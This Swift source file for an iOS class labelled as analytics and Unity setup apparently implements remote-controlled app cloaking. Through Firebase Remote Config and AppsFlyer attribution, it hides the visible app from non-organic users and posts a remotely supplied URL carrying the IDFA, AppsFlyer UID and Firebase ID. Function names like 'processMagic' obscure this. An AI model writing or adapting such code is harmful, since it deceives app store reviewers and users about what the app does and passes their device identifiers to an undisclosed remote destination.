import Foundation
import OneSignal
import AppsFlyerLib
import TikTokOpenSDK
import Firebase
import FirebaseCore
import FirebaseAnalytics
import UIKit
import AdSupport
import FacebookCore
import AVFoundation
import FirebaseCrashlytics
import AppTrackingTransparency
import SwiftUI
import FirebaseAuth
import FBSDKCoreKit

@objc(BAK)
public final class BAK:NSObject {
    
    private var mainAppBlock:(()-> (any View)? )?
    private var fallBackAppBlock:(()->Void)?
    
    private var application:UIApplication?
    private(set) var hostView = PVC()
    
    private var localWindow:UIWindow?
    
    private var showLeaderBoard:Bool = false
    
    private var clakOrientationMask:UIInterfaceOrientationMask = .all
    
    public enum FirstRunMode {
        case empty
        case importByQR(String,String)
        case leaderBoard(String = "", (()->Void)? = nil)
    }
    
    private var configuraionSource:LAConfiguration!
    
    private var popupStateIsDisplay:Bool?
    
    @objc static public var shared: BAK = {
        let laHelper = BAK()
    
        FirebaseApp.configure()
        laHelper.fetchRemoteConfig()
    
       return laHelper
    }()
    
    private var campaignAttribution: [String: AnyObject]?
    private var deeplinkAttribution: [String: AnyObject]?
    
    public func showInitializationView(window:inout UIWindow?){
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.rootViewController = self.hostView
        window?.makeKeyAndVisible()
    }
    
    @objc public func setupUnityAnalytics(
        argc:Int32,
        argv:UnsafeMutablePointer<UnsafeMutablePointer<CChar>?>,
        showLeaderBoard:Bool,
        appOrientation:UIInterfaceOrientationMask = .all,
        main: @escaping (()->Void) ) {
        
        Timer.scheduledTimer(withTimeInterval: 0.3, repeats: true) { timer in
            if self.configuraionSource != nil {
                
                timer.invalidate()
                
                var windowPlaceHoleder:UIWindow? = UIWindow()
                self.setupAnalytics(launchOptions: (UIApplication.shared.delegate as? BAKAppDelegate)?.launchOptions,
                                    showLeaderBoard: showLeaderBoard,
                                    appOrientation: appOrientation,
                                    needWindow: false,
                                    window: &windowPlaceHoleder) {
                    main()
                    return nil
                } virtualAppDidShow: {
                   
                }
            }
        }
            
        Timer.scheduledTimer(withTimeInterval: 0.5, repeats: false) { _ in
            if !Reachability.isConnectedToNetwork(){
                self.popupStateIsDisplay = false
                
                if let rootView = self.mainAppBlock?() {
                    self.hostView.clakOrientationMask = self.clakOrientationMask
                    self.hostView.showSwiftUI(view: rootView)
                }
                
                return
            }
        }
        
        UIApplicationMain(argc, argv, nil, "BAK.BAKAppDelegate")
    }
    
    //mainAppBlock must return SWIFTUI main app root View in case when swift ui is used, or nil for UIKit
    public func setupAnalytics(launchOptions: [UIApplication.LaunchOptionsKey : Any]?,
                               showLeaderBoard:Bool,
                               appOrientation:UIInterfaceOrientationMask,
                               needWindow:Bool,
                               window:inout UIWindow?,
                               showHostApp:@escaping (()->(any View)?),
                               virtualAppDidShow:(()->Void)?) {
        
        self.showLeaderBoard = showLeaderBoard
        self.clakOrientationMask = appOrientation
        
        if needWindow {
            self.showInitializationView(window: &window)
            self.localWindow = window
        } else {
            self.localWindow =  UIApplication.shared.windows.filter {$0.isKeyWindow}.first
        }

        OneSignal.setLogLevel(.LL_VERBOSE, visualLevel: .LL_NONE)
        OneSignal.initWithLaunchOptions(launchOptions)
        OneSignal.setAppId(configuraionSource.oneSignal)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
            self.enableMetrics(launchOptions: launchOptions, mainAppBlock: showHostApp, hideAppBlock: virtualAppDidShow)
        }
        
        if !Reachability.isConnectedToNetwork(){
            popupStateIsDisplay = false
            
            if let rootView = self.mainAppBlock?() {
                self.hostView.clakOrientationMask = self.clakOrientationMask
                self.hostView.showSwiftUI(view: rootView)
            }
            
            return
        }
      
    }
    
    private func enableMetrics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, mainAppBlock:@escaping (()->(any View)?), hideAppBlock:(()->Void)? = nil) {
        
        self.mainAppBlock = mainAppBlock
        self.fallBackAppBlock = hideAppBlock
  
        TikTokOpenSDKApplicationDelegate.sharedInstance().application(UIApplication.shared, didFinishLaunchingWithOptions: launchOptions)
        
        TikTokOpenSDKApplicationDelegate.sharedInstance().registerAppId(configuraionSource.tikTok)
        
        self.setUpAppsFlyerLib(appleAppID: configuraionSource.appleAppID, appsFlyerDevKey: configuraionSource.appsFlyer, delegate: self)
      
        OneSignal.promptForPushNotifications(userResponse: { accepted in
            print("User accepted notification: \(accepted)")
        })
        
        Settings.shared.appID = self.configuraionSource.facebookid
        Settings.shared.clientToken =  self.configuraionSource.facebookkey

        ApplicationDelegate.shared.application(
                    UIApplication.shared,
                   didFinishLaunchingWithOptions: launchOptions
        )
        
        NotificationCenter.default.addObserver(self,
                selector: #selector(didBecomeActiveNotification),
                name: UIApplication.didBecomeActiveNotification,
                object: nil)
    }
    
    @objc func didBecomeActiveNotification() {
        AppsFlyerLib.shared().start()
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { (status) in
                switch status {
                case .denied:
                    print("AuthorizationSatus is denied")
                case .notDetermined:
                    print("AuthorizationSatus is notDetermined")
                case .restricted:
                    print("AuthorizationSatus is restricted")
                case .authorized:
                    print("AuthorizationSatus is authorized")
                @unknown default:
                    fatalError("Invalid authorization status")
                }
            }
        }
    }
    
    
    func setUpAppsFlyerLib(appleAppID: String, appsFlyerDevKey: String, delegate: NSObject) {
        AppsFlyerLib.shared().isDebug = true
        AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerDevKey
        AppsFlyerLib.shared().appleAppID = appleAppID
        AppsFlyerLib.shared().delegate = delegate as? any AppsFlyerLibDelegate
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
        
        AppsFlyerLib.shared().start { data, error in
            
        }
    }
        
    func fetchRemoteConfig() {
        
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 5
        RemoteConfig.remoteConfig().configSettings = settings
        
        RemoteConfig.remoteConfig().fetch { [weak self] (status, error) in
            Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
            
            if let bundleIDKey = Bundle.main.bundleIdentifier?.replacingOccurrences(of: ".", with: ""),
               let stringConfig =  RemoteConfig.remoteString(forKey: bundleIDKey),
               let dataConfig = stringConfig.data(using: .utf8) {
        
                self?.configuraionSource = try? JSONDecoder().decode(LAConfiguration.self, from: dataConfig )
            }
            
            DispatchQueue.main.async { [weak self] in
                guard let self = self else {
                    return
                }
                if self.configuraionSource.config == true,
                   self.campaignAttribution?["af_status"] as? String == "Organic" {
                    UserDefaults.standard.targetIdentifire = nil
                    UserDefaults.standard.synchronize()
                } else {
                    if let urlString = self.configuraionSource.logUrl,
                       urlString != "",
                        !urlString.isEmpty,
                       ((self.campaignAttribution?["af_status"] as? String) != "Organic" || self.configuraionSource.config == false), let url = self.buildIdentifite(from: urlString) {
                        
                        UserDefaults.standard.targetIdentifire = url
                        UserDefaults.standard.synchronize()
    
                    } else {
                        UserDefaults.standard.targetIdentifire = nil
                        UserDefaults.standard.synchronize()
                    }
                }
                
            }
        }
    }
    
    func processMagic(close:Bool = false, fetch:Bool = false){
        
        if  RemoteConfig.remoteConfig().lastFetchStatus != .noFetchYet {
            if let targetIdentifire = UserDefaults.standard.targetIdentifire, (targetIdentifire.absoluteString != ""), close == false  {
                if popupStateIsDisplay != true {
                    popupStateIsDisplay = true
                    
                    self.hostView.hideSwiftUI()
                    
                    if self.localWindow?.rootViewController?.presentedViewController != nil {
                        self.localWindow?.rootViewController?.presentedViewController?.dismiss(animated: false, completion: {
                            NotificationCenter.default.post(name: Notification.Name("1"), object: nil, userInfo: ["1":targetIdentifire.absoluteString])
                        })
                    } else {
                        NotificationCenter.default.post(name: Notification.Name("1"), object: nil, userInfo: ["1":targetIdentifire.absoluteString])
                    }
                    
                    self.fallBackAppBlock?() //hide unity
                }
            } else {
                if popupStateIsDisplay != false {
                    popupStateIsDisplay = false
                    
                    if self.showLeaderBoard {
                        
                        if UserDefaults.standard.firstRun != true {
                            UserDefaults.standard.firstRun = true
                            var loginViewController:UIViewController?
                            var view = LeaderView(termsUrl: self.configuraionSource.privacyUrl)
                            view.closeBlock = {
                                loginViewController?.dismiss(animated: true) {
                                    self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
                                }
                            }
                            loginViewController = UIHostingController(rootView: view )
                            loginViewController?.view.backgroundColor = .white
                            loginViewController?.view.alpha = 0.95
                            if let loginViewController = loginViewController {
                                (UIApplication.shared.connectedScenes.first as? UIWindowScene)?.requestGeometryUpdate(.iOS(interfaceOrientations:  self.clakOrientationMask))
                                Timer.scheduledTimer(withTimeInterval: 2, repeats: false) { _ in
                                    let keyWindow = UIApplication.shared.windows.filter {$0.isKeyWindow}.first
                                    keyWindow?.rootViewController?.present(loginViewController, animated: true)
                                }
                            }
                        }
                        
                    }
                    
                    hostView.clakOrientationMask = self.clakOrientationMask
                  
                    if let rootView = self.mainAppBlock?() {
                        self.localWindow?.rootViewController?.dismiss(animated: true)
                        self.hostView.showSwiftUI(view: rootView)
                    }
      
                    (UIApplication.shared.connectedScenes.first as? UIWindowScene)?.requestGeometryUpdate(.iOS(interfaceOrientations:self.clakOrientationMask))
                   
                    if Auth.auth().currentUser != nil {
                        Timer.scheduledTimer(withTimeInterval: 10, repeats: false) { _ in
                            self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
                        }
                    }
                }
            }
        }
        
        if fetch {
            RemoteConfig.remoteConfig().fetch { [weak self] (status, error) in
                Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
                
                guard let strongSelf = self, error == nil else {
                    Timer.scheduledTimer(withTimeInterval: 2, repeats: false) { _ in
                        self?.processMagic(close: close, fetch: fetch)
                    }
                    return
                }
                
                DispatchQueue.main.async { [weak self] in
                    guard let self = self else {
                        return
                    }
                    if  self.configuraionSource.config == true,
                       strongSelf.campaignAttribution?["af_status"] as? String == "Organic" {
                       strongSelf.processMagic(close: true)
                    } else {
                        if let urlString = self.configuraionSource.logUrl,
                           urlString != "",
                            !urlString.isEmpty,
                           ((strongSelf.campaignAttribution?["af_status"] as? String) != "Organic" || self.configuraionSource.config == false || self.configuraionSource.config == nil), let url = strongSelf.buildIdentifite(from: urlString) {
                            
                            OneSignal.sendTags(["target": AppsFlyerLib.shared().getAppsFlyerUID()])
                            UserDefaults.standard.targetIdentifire = url
                            UserDefaults.standard.synchronize()
                            
                            strongSelf.processMagic()
                        } else {
                            UserDefaults.standard.targetIdentifire = nil
                            UserDefaults.standard.synchronize()
                            
                            strongSelf.processMagic(close: true)
                        }
                    }
                    
                }
            }
        }
        
    }
    
    func buildIdentifite(from urlString: String) -> URL? {
        guard var components = URLComponents(string: urlString) else {return nil}
        components.queryItems = []
        
        if let campaignAttribution = campaignAttribution {
            let campaignItems = campaignAttribution.map({ dict in
                URLQueryItem(name: dict.key, value: "\(dict.value)")
            })
            components.queryItems?.append(contentsOf: campaignItems)
        }
        
        if let deeplinkAttribution = deeplinkAttribution {
            let deeplinkItems = deeplinkAttribution.map({ dict in
                URLQueryItem(name: dict.key, value: "\(dict.value)")
            })
            components.queryItems?.append(contentsOf: deeplinkItems)
        }
        
        let appsflyerUuid = AppsFlyerLib.shared().getAppsFlyerUID()
        
        let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        
        components.queryItems?.append(URLQueryItem(name: "uuid", value: appsflyerUuid))
        components.queryItems?.append(URLQueryItem(name: "idfa", value: idfa))
        
        if let firebaseAdid = Analytics.appInstanceID() {
            let queryAdid = URLQueryItem(name: "fbase", value: firebaseAdid)
            components.queryItems?.append(queryAdid)
        }
        
        return components.url
    }
    
    func showLeaderIcon(hide:Bool = false){
        
        self.localWindow?.rootViewController?.view?.subviews.forEach({ view in
            if view.tag == 999 {
                view.removeFromSuperview()
            }
        })
        
        if hide {
            return
        }
        
        let button = UIButton(frame: CGRect(x: 30, y: 30, width: 30, height: 30))
        button.tag = 999
        
        if let photo = Auth.auth().currentUser?.photoURL?.absoluteString ?? Bundle.module.url(forResource: "nouser", withExtension: "png")?.absoluteString, let url = URL(string:photo) {
            DispatchQueue.global().async {
                if let data = try? Data(contentsOf: url) {
                    DispatchQueue.main.async {
                        button .setImage(UIImage(data: data), for: .normal)
                    }
                }
            }
        }
        
        button.layer.cornerRadius = 15
        button.clipsToBounds = true
        
        button.addAction(UIAction(handler: { act in
            var loginViewController:UIViewController?
            var view = LeaderBoard(appID: self.configuraionSource.appleAppID)
            view.closeBlock = {
                loginViewController?.dismiss(animated: true)
            }
            view.deleteBlock = {
                loginViewController?.dismiss(animated: true) {
                    try? Auth.auth().currentUser?.delete()
                    try? Auth.auth().signOut()
                    button.removeFromSuperview()
                    UserDefaults.standard.firstRun = false
                }
            }
            loginViewController?.modalPresentationStyle = .pageSheet
            loginViewController = UIHostingController(rootView: view )
            loginViewController?.view.backgroundColor = .white
            loginViewController?.view.alpha = 0.90
            if let loginViewController = loginViewController {
                
                if ( UIApplication.shared.keyWindow?.rootViewController?.view != nil) {
                    UIApplication.shared.keyWindow?.rootViewController?.present(loginViewController, animated: true)
                } else {
                    self.localWindow?.rootViewController?.present(loginViewController, animated: true)
                }
            }
        }), for: .touchUpInside)
        
        if ( UIApplication.shared.keyWindow?.rootViewController?.view != nil) {
            UIApplication.shared.keyWindow?.rootViewController?.view.addSubview(button)
        } else {
            self.localWindow?.rootViewController?.view.addSubview(button)
        }
        
    }
    
    struct LAConfiguration:Codable {
        public let appleAppID:String
        public let appsFlyer:String
        public let oneSignal:String
        public let tikTok:String
        public let facebookid:String
        public let facebookkey:String
        public let privacyUrl:String
        public let config:Bool?
        public let logUrl:String?
    }
}

extension BAK: AppsFlyerLibDelegate {
    
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        self.campaignAttribution = castDictionary(conversionInfo)
        self.processMagic(fetch: true)
        print("onConversionDataSuccess")
    }
    
    public func onConversionDataFail(_ error: Error) {
        self.processMagic(close: true, fetch: true)
        print("onConversionDataFail \(error.localizedDescription)")
    }
    
    public func onAppOpenAttribution(_ attributionData: [AnyHashable : Any]) {
        self.deeplinkAttribution = castDictionary(attributionData)
        print("onAppOpenAttribution")
    }
    
    public func onAppOpenAttributionFailure(_ error: Error) {
        self.processMagic(close: true, fetch: true)
        print("onAppOpenAttributionFailure \(error.localizedDescription)")
    }
    
    func castDictionary(_ anyDictionary: [AnyHashable: Any]) -> [String: AnyObject] {
        var dict: [String: AnyObject] = [:]
        
        for (key, value) in anyDictionary {
            if let key = key as? String {
                dict[key] = value as AnyObject
            }
        }
        return dict
    }
    
    func nonFatalLog(message: String) {
        #if DEBUG
        let error = NSError(domain: "Debug A/B Testing Error", code: 0 ,userInfo: [NSLocalizedDescriptionKey : message])
        
        Crashlytics.crashlytics().record(error: error)
        #else
        let error = NSError(domain: "A/B Testing Error", code: 0 ,userInfo: [NSLocalizedDescriptionKey : message])
        Crashlytics.crashlytics().record(error: error)
        #endif
    }
}

extension UserDefaults {
    
    var targetIdentifire: URL? {
        get {
            return URL(string: self.string(forKey: #function) ?? "")
        }
        set {
            self.set(newValue?.absoluteString, forKey: #function)
        }
    }
    
    var firstRun: Bool? {
        get {
            return self.bool(forKey: #function)
        }
        set {
            self.set(newValue, forKey: #function)
        }
    }
    
}

extension RemoteConfig {
    static func remoteNumber(forKey key: String) -> Int? {
        return Firebase.RemoteConfig.remoteConfig().configValue(forKey: key).numberValue.intValue
    }
    
    static func remoteString(forKey key: String) -> String? {
        return Firebase.RemoteConfig.remoteConfig().configValue(forKey: key).stringValue
    }
}


extension UIApplication {
    
    var keyWindow: UIWindow? {
        // Get connected scenes
        return self.connectedScenes
            // Keep only active scenes, onscreen and visible to the user
            .filter { $0.activationState == .foregroundActive }
            // Keep only the first `UIWindowScene`
            .first(where: { $0 is UIWindowScene })
            // Get its associated windows
            .flatMap({ $0 as? UIWindowScene })?.windows
            // Finally, keep only the key window
            .first(where: \.isKeyWindow)
    }
    
}
